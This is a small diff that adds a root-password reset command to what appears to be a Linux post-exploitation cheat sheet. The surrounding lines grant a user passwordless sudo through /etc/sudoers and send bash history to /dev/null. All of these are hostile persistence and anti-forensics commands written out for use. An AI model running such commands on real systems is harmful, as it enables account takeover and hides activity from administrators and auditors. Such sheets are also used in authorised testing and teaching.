@@ -161,6 +161,10 @@ Sudo rights to any user with no password (/etc/sudoers)
 ```
 max ALL=(ALL) NOPASSWD:ALL
 ```
+Resetting the root password
+```
+echo "root:$Iloveshells$" | chpasswd
+```
 Link Bash history to /dev/null
 ```
 ln -sf /dev/null ~/.bash_history
